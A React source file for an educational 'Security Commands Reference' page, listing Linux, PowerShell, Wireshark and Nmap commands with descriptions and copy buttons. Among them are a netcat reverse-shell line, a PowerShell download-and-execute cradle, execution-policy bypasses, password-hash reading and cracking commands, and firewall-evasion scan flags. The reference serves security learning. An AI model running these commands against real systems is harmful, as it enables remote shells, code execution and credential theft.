import {
  Box,
  Typography,
  Container,
  Paper,
  alpha,
  useTheme,
  IconButton,
  Chip,
  Grid,
  Tabs,
  Tab,
  TextField,
  InputAdornment,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Tooltip,
  Divider,
  Alert,
} from "@mui/material";
import { useState, useMemo } from "react";
import { useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import SearchIcon from "@mui/icons-material/Search";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import CheckIcon from "@mui/icons-material/Check";
import LearnPageLayout from "../components/LearnPageLayout";

// Page context for AI chat
const pageContext = `This is a Security Commands Reference page containing 200+ essential commands for security professionals organized into 4 main categories:

1. Linux/Bash Commands:
- File Operations (ls, find, grep, cat, strings, file)
- Network (netstat, ss, ip, nmap, tcpdump, curl, wget, netcat)
- Process & System (ps, top, uname, crontab, systemctl)
- Privilege Escalation (sudo -l, id, getcap, history)
- Hash & Crypto (md5sum, sha256sum, hashcat, john, openssl)

2. PowerShell Commands:
- File Operations (Get-ChildItem, Get-Content, Select-String, Get-FileHash)
- Network (Get-NetTCPConnection, Test-NetConnection, Invoke-WebRequest)
- Process & System (Get-Process, Get-Service, Get-ComputerInfo, Get-ScheduledTask)
- Active Directory (Get-ADUser, Get-ADGroup, Get-ADComputer, Get-ADDomain)
- Privilege & Security (whoami /all, net user, Get-LocalUser)
- Execution & Bypass (Set-ExecutionPolicy, IEX download cradles)

3. Wireshark Filters:
- Protocol Filters (http, dns, tcp, udp, tls, smb)
- IP & Port Filters (ip.addr, tcp.port, src/dst filters)
- HTTP Analysis (request methods, response codes, hosts, URIs)
- Security Analysis (SYN scans, DNS queries, packet contents)
- Compound Filters (combining multiple conditions)

4. Nmap Commands:
- Host Discovery (-sn, -Pn, -PS, -PA, -PU, -PE, -PR)
- Port Scanning Techniques (-sS, -sT, -sU, -sA, -sN, -sF, -sX)
- Port Specification (-p, --top-ports, -F)
- Service & Version Detection (-sV, -A, -O)
- NSE Scripts (--script=vuln, safe, exploit, auth, brute)
- Timing & Performance (-T0 to -T5, --min-rate, --max-rate)
- Output Formats (-oN, -oX, -oG, -oA)
- Firewall/IDS Evasion (-f, -D, -S, -g, --data-length)

Users can search commands, click to copy, and view examples for each command.`;

interface TabPanelProps {
  children?: React.ReactNode;
  index: number;
  value: number;
}

function TabPanel({ children, value, index }: TabPanelProps) {
  return (
    <div hidden={value !== index}>
      {value === index && <Box sx={{ py: 3 }}>{children}</Box>}
    </div>
  );
}

interface Command {
  command: string;
  description: string;
  category: string;
  example?: string;
}

const linuxCommands: Command[] = [
  // File Operations
  { command: "ls -la", description: "List all files including hidden, with detailed permissions", category: "File Operations", example: "ls -la /var/log" },
  { command: "find / -name '*.log' 2>/dev/null", description: "Find all log files, suppress permission errors", category: "File Operations" },
  { command: "find / -perm -4000 2>/dev/null", description: "Find SUID binaries (privilege escalation)", category: "File Operations" },
  { command: "grep -r 'password' /etc 2>/dev/null", description: "Recursively search for 'password' in /etc", category: "File Operations" },
  { command: "cat /etc/passwd", description: "View user accounts on the system", category: "File Operations" },
  { command: "cat /etc/shadow", description: "View password hashes (requires root)", category: "File Operations" },
  { command: "strings <binary>", description: "Extract readable strings from binary files", category: "File Operations" },
  { command: "file <filename>", description: "Determine file type", category: "File Operations" },
  
  // Network
  { command: "netstat -tulpn", description: "Show listening ports with process IDs", category: "Network", example: "sudo netstat -tulpn" },
  { command: "ss -tulpn", description: "Modern replacement for netstat", category: "Network" },
  { command: "ip a", description: "Show all network interfaces and IPs", category: "Network" },
  { command: "ip route", description: "Show routing table", category: "Network" },
  { command: "nmap -sV -sC <target>", description: "Service version detection with default scripts", category: "Network" },
  { command: "nmap -p- <target>", description: "Scan all 65535 ports", category: "Network" },
  { command: "tcpdump -i eth0 -w capture.pcap", description: "Capture network traffic to file", category: "Network" },
  { command: "curl -I <url>", description: "Fetch HTTP headers only", category: "Network" },
  { command: "wget -r -np <url>", description: "Recursively download website", category: "Network" },
  { command: "nc -lvnp 4444", description: "Start netcat listener on port 4444", category: "Network" },
  { command: "nc -e /bin/bash <ip> <port>", description: "Reverse shell to attacker", category: "Network" },
  
  // Process & System
  { command: "ps aux", description: "List all running processes with details", category: "Process & System" },
  { command: "top -n 1", description: "One-time snapshot of running processes", category: "Process & System" },
  { command: "htop", description: "Interactive process viewer", category: "Process & System" },
  { command: "uname -a", description: "System information (kernel version, arch)", category: "Process & System" },
  { command: "cat /etc/os-release", description: "Distribution information", category: "Process & System" },
  { command: "crontab -l", description: "List scheduled cron jobs for current user", category: "Process & System" },
  { command: "cat /etc/crontab", description: "View system-wide cron jobs", category: "Process & System" },
  { command: "systemctl list-units --type=service", description: "List all services", category: "Process & System" },
  
  // Privilege Escalation
  { command: "sudo -l", description: "List sudo privileges for current user", category: "Privilege Escalation" },
  { command: "id", description: "Show current user ID and group memberships", category: "Privilege Escalation" },
  { command: "whoami", description: "Show current username", category: "Privilege Escalation" },
  { command: "getcap -r / 2>/dev/null", description: "Find files with capabilities set", category: "Privilege Escalation" },
  { command: "cat /etc/sudoers", description: "View sudo configuration (requires root)", category: "Privilege Escalation" },
  { command: "env", description: "Show environment variables", category: "Privilege Escalation" },
  { command: "history", description: "View command history (may contain credentials)", category: "Privilege Escalation" },
  
  // Hash & Crypto
  { command: "md5sum <file>", description: "Calculate MD5 hash of file", category: "Hash & Crypto" },
  { command: "sha256sum <file>", description: "Calculate SHA-256 hash of file", category: "Hash & Crypto" },
  { command: "hashcat -m 0 hash.txt wordlist.txt", description: "Crack MD5 hashes with wordlist", category: "Hash & Crypto" },
  { command: "john --wordlist=rockyou.txt hash.txt", description: "Crack hashes with John the Ripper", category: "Hash & Crypto" },
  { command: "openssl enc -aes-256-cbc -d -in encrypted", description: "Decrypt AES-256 encrypted file", category: "Hash & Crypto" },
];

const powershellCommands: Command[] = [
  // File Operations
  { command: "Get-ChildItem -Recurse -Force", description: "List all files including hidden, recursively", category: "File Operations", example: "gci -r -fo C:\\Users" },
  { command: "Get-Content <file>", description: "Display file contents (like cat)", category: "File Operations" },
  { command: "Select-String -Path *.txt -Pattern 'password'", description: "Search for pattern in files (like grep)", category: "File Operations" },
  { command: "Get-FileHash <file> -Algorithm SHA256", description: "Calculate file hash", category: "File Operations" },
  { command: "icacls <file>", description: "Display file permissions", category: "File Operations" },
  { command: "Get-Acl <path> | Format-List", description: "Detailed ACL information", category: "File Operations" },
  
  // Network
  { command: "Get-NetTCPConnection", description: "Show active TCP connections", category: "Network" },
  { command: "Get-NetUDPEndpoint", description: "Show UDP endpoints", category: "Network" },
  { command: "Get-NetIPAddress", description: "Show IP addresses on all interfaces", category: "Network" },
  { command: "Test-NetConnection -Port 443 <host>", description: "Test specific port connectivity", category: "Network" },
  { command: "Invoke-WebRequest -Uri <url>", description: "HTTP request (like curl)", category: "Network", example: "iwr https://example.com" },
  { command: "Resolve-DnsName <domain>", description: "DNS lookup", category: "Network" },
  { command: "Get-NetFirewallRule | Where Enabled -eq True", description: "List enabled firewall rules", category: "Network" },
  { command: "netsh wlan show profiles", description: "Show saved WiFi profiles", category: "Network" },
  
  // Process & System
  { command: "Get-Process", description: "List running processes", category: "Process & System" },
  { command: "Get-Service | Where Status -eq Running", description: "List running services", category: "Process & System" },
  { command: "Get-ComputerInfo", description: "Detailed system information", category: "Process & System" },
  { command: "Get-WmiObject Win32_OperatingSystem", description: "OS information via WMI", category: "Process & System" },
  { command: "Get-ScheduledTask", description: "List scheduled tasks", category: "Process & System" },
  { command: "Get-EventLog -LogName Security -Newest 50", description: "View recent security events", category: "Process & System" },
  { command: "Get-HotFix", description: "List installed updates/patches", category: "Process & System" },
  { command: "systeminfo", description: "Detailed system configuration", category: "Process & System" },
  
  // Active Directory
  { command: "Get-ADUser -Filter *", description: "List all AD users", category: "Active Directory" },
  { command: "Get-ADGroup -Filter *", description: "List all AD groups", category: "Active Directory" },
  { command: "Get-ADComputer -Filter *", description: "List all AD computers", category: "Active Directory" },
  { command: "Get-ADDomain", description: "Domain information", category: "Active Directory" },
  { command: "Get-ADGroupMember -Identity 'Domain Admins'", description: "List Domain Admins", category: "Active Directory" },
  { command: "([adsisearcher]'objectCategory=User').FindAll()", description: "ADSI search for users (no module needed)", category: "Active Directory" },
  
  // Privilege & Security
  { command: "whoami /all", description: "Current user with all privileges and groups", category: "Privilege & Security" },
  { command: "whoami /priv", description: "Current user privileges", category: "Privilege & Security" },
  { command: "net user", description: "List local users", category: "Privilege & Security" },
  { command: "net localgroup Administrators", description: "List local administrators", category: "Privilege & Security" },
  { command: "Get-LocalUser | Select Name,Enabled,LastLogon", description: "Local user details", category: "Privilege & Security" },
  { command: "secedit /export /cfg sec.cfg", description: "Export security policy", category: "Privilege & Security" },
  
  // Execution & Bypass
  { command: "Set-ExecutionPolicy Bypass -Scope Process", description: "Bypass execution policy for session", category: "Execution & Bypass" },
  { command: "powershell -ep bypass -file script.ps1", description: "Run script bypassing execution policy", category: "Execution & Bypass" },
  { command: "IEX (New-Object Net.WebClient).DownloadString('<url>')", description: "Download and execute script in memory", category: "Execution & Bypass" },
  { command: "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<base64>'))", description: "Decode Base64 string", category: "Execution & Bypass" },
];

const wiresharkFilters: Command[] = [
  // Protocol Filters
  { command: "http", description: "Show only HTTP traffic", category: "Protocol Filters" },
  { command: "dns", description: "Show only DNS traffic", category: "Protocol Filters" },
  { command: "tcp", description: "Show only TCP traffic", category: "Protocol Filters" },
  { command: "udp", description: "Show only UDP traffic", category: "Protocol Filters" },
  { command: "icmp", description: "Show only ICMP (ping) traffic", category: "Protocol Filters" },
  { command: "tls", description: "Show only TLS/SSL traffic", category: "Protocol Filters" },
  { command: "ssh", description: "Show only SSH traffic", category: "Protocol Filters" },
  { command: "ftp", description: "Show only FTP traffic", category: "Protocol Filters" },
  { command: "smb || smb2", description: "Show SMB traffic (both versions)", category: "Protocol Filters" },
  
  // IP & Port Filters
  { command: "ip.addr == 192.168.1.1", description: "Traffic to/from specific IP", category: "IP & Port Filters" },
  { command: "ip.src == 192.168.1.1", description: "Traffic from specific source IP", category: "IP & Port Filters" },
  { command: "ip.dst == 192.168.1.1", description: "Traffic to specific destination IP", category: "IP & Port Filters" },
  { command: "ip.addr == 192.168.1.0/24", description: "Traffic to/from subnet", category: "IP & Port Filters" },
  { command: "tcp.port == 443", description: "Traffic on specific port", category: "IP & Port Filters" },
  { command: "tcp.dstport == 80", description: "Traffic to destination port 80", category: "IP & Port Filters" },
  { command: "tcp.srcport == 4444", description: "Traffic from source port 4444", category: "IP & Port Filters" },
  { command: "tcp.port in {80 443 8080}", description: "Traffic on multiple ports", category: "IP & Port Filters" },
  
  // HTTP Analysis
  { command: "http.request.method == \"GET\"", description: "HTTP GET requests only", category: "HTTP Analysis" },
  { command: "http.request.method == \"POST\"", description: "HTTP POST requests only", category: "HTTP Analysis" },
  { command: "http.response.code == 200", description: "HTTP 200 OK responses", category: "HTTP Analysis" },
  { command: "http.response.code >= 400", description: "HTTP error responses", category: "HTTP Analysis" },
  { command: "http.host contains \"example\"", description: "HTTP requests to hosts containing 'example'", category: "HTTP Analysis" },
  { command: "http.request.uri contains \"admin\"", description: "HTTP requests with 'admin' in URI", category: "HTTP Analysis" },
  { command: "http.cookie", description: "HTTP packets with cookies", category: "HTTP Analysis" },
  { command: "http.authbasic", description: "HTTP Basic authentication", category: "HTTP Analysis" },
  
  // Security Analysis
  { command: "tcp.flags.syn == 1 && tcp.flags.ack == 0", description: "TCP SYN packets (scan detection)", category: "Security Analysis" },
  { command: "tcp.flags.rst == 1", description: "TCP RST packets (connection resets)", category: "Security Analysis" },
  { command: "icmp.type == 3", description: "ICMP destination unreachable", category: "Security Analysis" },
  { command: "dns.flags.response == 0", description: "DNS queries only", category: "Security Analysis" },
  { command: "dns.qry.name contains \"malware\"", description: "DNS queries for suspicious domains", category: "Security Analysis" },
  { command: "frame contains \"password\"", description: "Frames containing 'password' string", category: "Security Analysis" },
  { command: "tcp.analysis.retransmission", description: "Retransmitted TCP packets", category: "Security Analysis" },
  { command: "tcp.analysis.duplicate_ack", description: "Duplicate ACKs (possible issues)", category: "Security Analysis" },
  
  // Compound Filters
  { command: "ip.addr == 192.168.1.1 && http", description: "HTTP traffic from/to specific IP", category: "Compound Filters" },
  { command: "(http.request || http.response) && ip.addr == 192.168.1.1", description: "HTTP requests and responses for IP", category: "Compound Filters" },
  { command: "!arp && !icmp && !dns", description: "Exclude ARP, ICMP, and DNS", category: "Compound Filters" },
  { command: "tcp && !port 22", description: "TCP traffic excluding SSH", category: "Compound Filters" },
  { command: "http && (http.response.code == 401 || http.response.code == 403)", description: "HTTP auth failures", category: "Compound Filters" },
];

const nmapCommands: Command[] = [
  // Host Discovery
  { command: "nmap -sn 192.168.1.0/24", description: "Ping scan - discover hosts without port scanning", category: "Host Discovery", example: "nmap -sn 10.0.0.0/24" },
  { command: "nmap -Pn <target>", description: "Skip host discovery, treat all hosts as online", category: "Host Discovery" },
  { command: "nmap -PS22,80,443 <target>", description: "TCP SYN ping on specific ports", category: "Host Discovery" },
  { command: "nmap -PA22,80,443 <target>", description: "TCP ACK ping on specific ports", category: "Host Discovery" },
  { command: "nmap -PU53,161 <target>", description: "UDP ping on specific ports", category: "Host Discovery" },
  { command: "nmap -PE <target>", description: "ICMP echo ping (traditional ping)", category: "Host Discovery" },
  { command: "nmap -PR 192.168.1.0/24", description: "ARP scan for local network (fastest)", category: "Host Discovery" },
  { command: "nmap -sL 192.168.1.0/24", description: "List targets without scanning (DNS resolution)", category: "Host Discovery" },
  
  // Port Scanning Techniques
  { command: "nmap -sS <target>", description: "TCP SYN scan (stealth scan, default)", category: "Port Scanning", example: "nmap -sS 192.168.1.1" },
  { command: "nmap -sT <target>", description: "TCP connect scan (full handshake)", category: "Port Scanning" },
  { command: "nmap -sU <target>", description: "UDP scan (slower, essential for DNS/DHCP/SNMP)", category: "Port Scanning" },
  { command: "nmap -sA <target>", description: "TCP ACK scan (detect firewall rules)", category: "Port Scanning" },
  { command: "nmap -sW <target>", description: "TCP Window scan (like ACK but detects open ports)", category: "Port Scanning" },
  { command: "nmap -sN <target>", description: "TCP Null scan (no flags set)", category: "Port Scanning" },
  { command: "nmap -sF <target>", description: "TCP FIN scan (only FIN flag)", category: "Port Scanning" },
  { command: "nmap -sX <target>", description: "Xmas scan (FIN, PSH, URG flags)", category: "Port Scanning" },
  { command: "nmap -sM <target>", description: "Maimon scan (FIN/ACK flags)", category: "Port Scanning" },
  { command: "nmap -sI <zombie> <target>", description: "Idle scan using zombie host (very stealthy)", category: "Port Scanning" },
  { command: "nmap -sO <target>", description: "IP protocol scan (discover supported protocols)", category: "Port Scanning" },
  
  // Port Specification
  { command: "nmap -p 80 <target>", description: "Scan specific port", category: "Port Specification" },
  { command: "nmap -p 80,443,8080 <target>", description: "Scan multiple specific ports", category: "Port Specification" },
  { command: "nmap -p 1-1000 <target>", description: "Scan port range", category: "Port Specification" },
  { command: "nmap -p- <target>", description: "Scan all 65535 ports", category: "Port Specification", example: "nmap -p- 192.168.1.1" },
  { command: "nmap -p U:53,161,T:80,443 <target>", description: "Scan specific UDP and TCP ports", category: "Port Specification" },
  { command: "nmap --top-ports 100 <target>", description: "Scan top 100 most common ports", category: "Port Specification" },
  { command: "nmap -F <target>", description: "Fast scan (top 100 ports)", category: "Port Specification" },
  { command: "nmap -r <target>", description: "Scan ports consecutively (not randomized)", category: "Port Specification" },
  
  // Service & Version Detection
  { command: "nmap -sV <target>", description: "Detect service versions", category: "Service Detection", example: "nmap -sV 192.168.1.1" },
  { command: "nmap -sV --version-intensity 5 <target>", description: "Set version scan intensity (0-9)", category: "Service Detection" },
  { command: "nmap -sV --version-light <target>", description: "Light version detection (faster)", category: "Service Detection" },
  { command: "nmap -sV --version-all <target>", description: "Try all probes for version detection", category: "Service Detection" },
  { command: "nmap -A <target>", description: "Aggressive scan (OS, version, scripts, traceroute)", category: "Service Detection" },
  { command: "nmap -O <target>", description: "OS detection", category: "Service Detection" },
  { command: "nmap -O --osscan-guess <target>", description: "Aggressive OS guessing", category: "Service Detection" },
  
  // NSE Scripts
  { command: "nmap -sC <target>", description: "Run default scripts (same as --script=default)", category: "NSE Scripts", example: "nmap -sC 192.168.1.1" },
  { command: "nmap --script=vuln <target>", description: "Run vulnerability detection scripts", category: "NSE Scripts" },
  { command: "nmap --script=safe <target>", description: "Run safe (non-intrusive) scripts", category: "NSE Scripts" },
  { command: "nmap --script=exploit <target>", description: "Run exploit scripts (use carefully)", category: "NSE Scripts" },
  { command: "nmap --script=auth <target>", description: "Run authentication-related scripts", category: "NSE Scripts" },
  { command: "nmap --script=brute <target>", description: "Run brute-force scripts", category: "NSE Scripts" },
  { command: "nmap --script=discovery <target>", description: "Run discovery scripts", category: "NSE Scripts" },
  { command: "nmap --script=http-* <target>", description: "Run all HTTP-related scripts", category: "NSE Scripts" },
  { command: "nmap --script=smb-vuln-* <target>", description: "Check for SMB vulnerabilities", category: "NSE Scripts" },
  { command: "nmap --script=ssl-heartbleed <target>", description: "Check for Heartbleed vulnerability", category: "NSE Scripts" },
  { command: "nmap --script=http-sql-injection <target>", description: "Test for SQL injection", category: "NSE Scripts" },
  { command: "nmap --script-args <args>", description: "Pass arguments to scripts", category: "NSE Scripts", example: "nmap --script=http-brute --script-args http-brute.path=/admin" },
  
  // Timing & Performance
  { command: "nmap -T0 <target>", description: "Paranoid timing (IDS evasion, very slow)", category: "Timing & Performance" },
  { command: "nmap -T1 <target>", description: "Sneaky timing (IDS evasion)", category: "Timing & Performance" },
  { command: "nmap -T2 <target>", description: "Polite timing (less bandwidth)", category: "Timing & Performance" },
  { command: "nmap -T3 <target>", description: "Normal timing (default)", category: "Timing & Performance" },
  { command: "nmap -T4 <target>", description: "Aggressive timing (faster, reliable networks)", category: "Timing & Performance", example: "nmap -T4 192.168.1.1" },
  { command: "nmap -T5 <target>", description: "Insane timing (fastest, may miss ports)", category: "Timing & Performance" },
  { command: "nmap --min-rate 1000 <target>", description: "Send at least 1000 packets/second", category: "Timing & Performance" },
  { command: "nmap --max-rate 100 <target>", description: "Send no more than 100 packets/second", category: "Timing & Performance" },
  { command: "nmap --host-timeout 30m <target>", description: "Give up on host after 30 minutes", category: "Timing & Performance" },
  
  // Output Formats
  { command: "nmap -oN output.txt <target>", description: "Normal output to file", category: "Output Formats" },
  { command: "nmap -oX output.xml <target>", description: "XML output (for tools/parsing)", category: "Output Formats" },
  { command: "nmap -oG output.gnmap <target>", description: "Grepable output", category: "Output Formats" },
  { command: "nmap -oA basename <target>", description: "Output in all formats (.nmap, .xml, .gnmap)", category: "Output Formats" },
  { command: "nmap -v <target>", description: "Increase verbosity", category: "Output Formats" },
  { command: "nmap -vv <target>", description: "Very verbose output", category: "Output Formats" },
  { command: "nmap -d <target>", description: "Debugging output", category: "Output Formats" },
  { command: "nmap --open <target>", description: "Only show open ports", category: "Output Formats" },
  { command: "nmap --packet-trace <target>", description: "Show all packets sent/received", category: "Output Formats" },
  { command: "nmap --reason <target>", description: "Display reason for port state", category: "Output Formats" },
  
  // Firewall/IDS Evasion
  { command: "nmap -f <target>", description: "Fragment packets (evade firewalls)", category: "Firewall Evasion" },
  { command: "nmap --mtu 24 <target>", description: "Set specific MTU size", category: "Firewall Evasion" },
  { command: "nmap -D RND:10 <target>", description: "Use 10 random decoy IPs", category: "Firewall Evasion" },
  { command: "nmap -D decoy1,decoy2,ME <target>", description: "Use specific decoys (ME = your IP)", category: "Firewall Evasion" },
  { command: "nmap -S <spoof_ip> <target>", description: "Spoof source IP (need to sniff responses)", category: "Firewall Evasion" },
  { command: "nmap -g 53 <target>", description: "Use source port 53 (DNS - often allowed)", category: "Firewall Evasion" },
  { command: "nmap --data-length 25 <target>", description: "Append random data to packets", category: "Firewall Evasion" },
  { command: "nmap --randomize-hosts <targets>", description: "Randomize target scan order", category: "Firewall Evasion" },
  { command: "nmap --spoof-mac 0 <target>", description: "Spoof MAC address (random)", category: "Firewall Evasion" },
  { command: "nmap --badsum <target>", description: "Send packets with bad checksums", category: "Firewall Evasion" },
  
  // Common Combinations
  { command: "nmap -sS -sV -sC -O <target>", description: "Comprehensive scan (SYN, version, scripts, OS)", category: "Common Combinations", example: "nmap -sS -sV -sC -O 192.168.1.1" },
  { command: "nmap -sS -sU -p- <target>", description: "Full TCP and UDP port scan", category: "Common Combinations" },
  { command: "nmap -sV -sC -p- -T4 <target>", description: "Full port scan with version/scripts (fast)", category: "Common Combinations" },
  { command: "nmap -Pn -sS -sV -p- --open <target>", description: "Stealth scan, all ports, open only", category: "Common Combinations" },
  { command: "nmap -sn -PR 192.168.1.0/24 -oG - | grep Up", description: "Quick host discovery, list alive hosts", category: "Common Combinations" },
  { command: "nmap -sV --script=vuln -p 80,443,8080 <target>", description: "Web server vulnerability scan", category: "Common Combinations" },
  { command: "nmap -p 445 --script=smb-vuln* <target>", description: "SMB vulnerability scan (EternalBlue, etc.)", category: "Common Combinations" },
  { command: "nmap -sU -p 161 --script=snmp-brute <target>", description: "SNMP enumeration", category: "Common Combinations" },
];

export default function CommandsPage() {
  const theme = useTheme();
  const navigate = useNavigate();
  const [selectedTab, setSelectedTab] = useState(0);
  const [searchQuery, setSearchQuery] = useState("");
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);

  const getCurrentCommands = () => {
    switch (selectedTab) {
      case 0: return linuxCommands;
      case 1: return powershellCommands;
      case 2: return wiresharkFilters;
      case 3: return nmapCommands;
      default: return [];
    }
  };

  const filteredCommands = useMemo(() => {
    const commands = getCurrentCommands();
    if (!searchQuery.trim()) return commands;
    const query = searchQuery.toLowerCase();
    return commands.filter(
      (cmd) =>
        cmd.command.toLowerCase().includes(query) ||
        cmd.description.toLowerCase().includes(query) ||
        cmd.category.toLowerCase().includes(query)
    );
  }, [selectedTab, searchQuery]);

  const categories = useMemo(() => {
    return [...new Set(getCurrentCommands().map((c) => c.category))];
  }, [selectedTab]);

  const copyToClipboard = (command: string) => {
    navigator.clipboard.writeText(command);
    setCopiedCommand(command);
    setTimeout(() => setCopiedCommand(null), 2000);
  };

  const getTabColor = () => {
    switch (selectedTab) {
      case 0: return "#f97316"; // Linux orange
      case 1: return "#0078d4"; // PowerShell blue
      case 2: return "#6366f1"; // Wireshark purple
      case 3: return "#10b981"; // Nmap green
      default: return theme.palette.primary.main;
    }
  };

  return (
    <LearnPageLayout pageTitle="Security Commands Reference" pageContext={pageContext}>
    <Container maxWidth="lg" sx={{ py: 4 }}>
      {/* Back Button */}
      <IconButton onClick={() => navigate("/learn")} sx={{ mb: 2 }}>
        <ArrowBackIcon />
      </IconButton>

      {/* Header */}
      <Box sx={{ mb: 5 }}>
        <Typography
          variant="h3"
          sx={{
            fontWeight: 800,
            mb: 2,
            background: `linear-gradient(135deg, #f97316, #0078d4, #6366f1, #10b981)`,
            backgroundClip: "text",
            WebkitBackgroundClip: "text",
            WebkitTextFillColor: "transparent",
          }}
        >
          💻 Security Commands Reference
        </Typography>
        <Typography variant="h6" color="text.secondary" sx={{ maxWidth: 900 }}>
          Essential Linux, PowerShell, Wireshark, and Nmap commands for security professionals. Click any command to copy.
        </Typography>
      </Box>

      {/* Tabs */}
      <Paper sx={{ borderRadius: 3, mb: 4 }}>
        <Tabs
          value={selectedTab}
          onChange={(_, v) => { setSelectedTab(v); setSearchQuery(""); }}
          sx={{
            borderBottom: 1,
            borderColor: "divider",
            "& .MuiTab-root": { fontWeight: 600, textTransform: "none", minHeight: 60 },
            "& .Mui-selected": { color: `${getTabColor()} !important` },
            "& .MuiTabs-indicator": { bgcolor: getTabColor() },
          }}
        >
          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>🐧 Linux/Bash</Box>} />
          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>⚡ PowerShell</Box>} />
          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>🦈 Wireshark</Box>} />
          <Tab label={<Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>🔍 Nmap</Box>} />
        </Tabs>

        <Box sx={{ p: 3 }}>
          {/* Search */}
          <TextField
            fullWidth
            size="small"
            placeholder="Search commands..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            sx={{ mb: 3, maxWidth: 400 }}
            InputProps={{
              startAdornment: (
                <InputAdornment position="start">
                  <SearchIcon color="action" />
                </InputAdornment>
              ),
            }}
          />

          {/* Category Stats */}
          <Box sx={{ display: "flex", flexWrap: "wrap", gap: 1, mb: 3 }}>
            {categories.map((cat) => {
              const count = getCurrentCommands().filter((c) => c.category === cat).length;
              return (
                <Chip
                  key={cat}
                  label={`${cat} (${count})`}
                  size="small"
                  onClick={() => setSearchQuery(cat)}
                  sx={{ cursor: "pointer", bgcolor: alpha(getTabColor(), 0.1), color: getTabColor(), fontWeight: 500 }}
                />
              );
            })}
          </Box>

          <Alert severity="info" sx={{ mb: 3, borderRadius: 2 }}>
            <Typography variant="body2">
              <strong>💡 Tip:</strong> Click any command to copy to clipboard. Use with caution - some commands require elevated privileges or may be destructive.
            </Typography>
          </Alert>

          {/* Commands Table */}
          <TableContainer sx={{ maxHeight: 600 }}>
            <Table stickyHeader size="small">
              <TableHead>
                <TableRow>
                  <TableCell sx={{ fontWeight: 700, bgcolor: alpha(getTabColor(), 0.05), width: "40%" }}>Command</TableCell>
                  <TableCell sx={{ fontWeight: 700, bgcolor: alpha(getTabColor(), 0.05) }}>Description</TableCell>
                  <TableCell sx={{ fontWeight: 700, bgcolor: alpha(getTabColor(), 0.05), width: 100 }}>Category</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {filteredCommands.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={3} sx={{ textAlign: "center", py: 4 }}>
                      <Typography color="text.secondary">No commands match your search</Typography>
                    </TableCell>
                  </TableRow>
                ) : (
                  filteredCommands.map((cmd, index) => (
                    <TableRow
                      key={`${cmd.command}-${index}`}
                      hover
                      sx={{
                        cursor: "pointer",
                        "&:hover": { bgcolor: alpha(getTabColor(), 0.03) },
                      }}
                      onClick={() => copyToClipboard(cmd.command)}
                    >
                      <TableCell>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                          <Tooltip title={copiedCommand === cmd.command ? "Copied!" : "Click to copy"}>
                            <Box
                              component="code"
                              sx={{
                                fontFamily: "monospace",
                                fontSize: "0.8rem",
                                bgcolor: alpha(getTabColor(), 0.05),
                                px: 1.5,
                                py: 0.75,
                                borderRadius: 1,
                                flex: 1,
                                display: "flex",
                                alignItems: "center",
                                justifyContent: "space-between",
                                border: `1px solid ${alpha(getTabColor(), 0.15)}`,
                                "&:hover": { bgcolor: alpha(getTabColor(), 0.1) },
                              }}
                            >
                              <span style={{ wordBreak: "break-all" }}>{cmd.command}</span>
                              {copiedCommand === cmd.command ? (
                                <CheckIcon sx={{ fontSize: 16, color: "success.main", ml: 1, flexShrink: 0 }} />
                              ) : (
                                <ContentCopyIcon sx={{ fontSize: 14, opacity: 0.5, ml: 1, flexShrink: 0 }} />
                              )}
                            </Box>
                          </Tooltip>
                        </Box>
                      </TableCell>
                      <TableCell>
                        <Typography variant="body2">{cmd.description}</Typography>
                        {cmd.example && (
                          <Typography variant="caption" color="text.secondary" sx={{ display: "block", mt: 0.5 }}>
                            Example: <code style={{ fontSize: "0.75rem" }}>{cmd.example}</code>
                          </Typography>
                        )}
                      </TableCell>
                      <TableCell>
                        <Chip
                          label={cmd.category}
                          size="small"
                          sx={{ fontSize: "0.65rem", bgcolor: alpha(getTabColor(), 0.1), color: getTabColor() }}
                        />
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </TableContainer>

          <Box sx={{ mt: 2, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <Typography variant="caption" color="text.secondary">
              Showing {filteredCommands.length} of {getCurrentCommands().length} commands
            </Typography>
          </Box>
        </Box>
      </Paper>

      {/* Quick Tips */}
      <Paper sx={{ p: 4, borderRadius: 3 }}>
        <Typography variant="h5" sx={{ fontWeight: 700, mb: 3 }}>
          📝 Quick Tips
        </Typography>
        <Grid container spacing={3}>
          {[
            { title: "Linux Privilege Escalation", tips: ["Always run 'sudo -l' first", "Check for SUID binaries", "Look for credentials in history/config files", "Check cron jobs for misconfigs"], color: "#f97316" },
            { title: "PowerShell Recon", tips: ["whoami /all shows all privileges", "Get-Process for running processes", "Check scheduled tasks for persistence", "Look for stored credentials"], color: "#0078d4" },
            { title: "Wireshark Analysis", tips: ["Follow TCP streams for full conversations", "Export HTTP objects for file analysis", "Use Statistics > Endpoints for overview", "Color coding helps identify anomalies"], color: "#6366f1" },
            { title: "Nmap Scanning", tips: ["Start with -sn for host discovery", "Use -T4 for faster reliable scans", "-sV -sC for version + default scripts", "Always save output with -oA"], color: "#10b981" },
          ].map((section) => (
            <Grid item xs={12} md={4} key={section.title}>
              <Box sx={{ p: 2, borderRadius: 2, bgcolor: alpha(section.color, 0.05), border: `1px solid ${alpha(section.color, 0.15)}`, height: "100%" }}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700, color: section.color, mb: 1.5 }}>
                  {section.title}
                </Typography>
                {section.tips.map((tip, i) => (
                  <Typography key={i} variant="body2" color="text.secondary" sx={{ mb: 0.75, display: "flex", alignItems: "flex-start", gap: 1 }}>
                    <span>•</span> {tip}
                  </Typography>
                ))}
              </Box>
            </Grid>
          ))}
        </Grid>
      </Paper>
    </Container>
    </LearnPageLayout>
  );
}
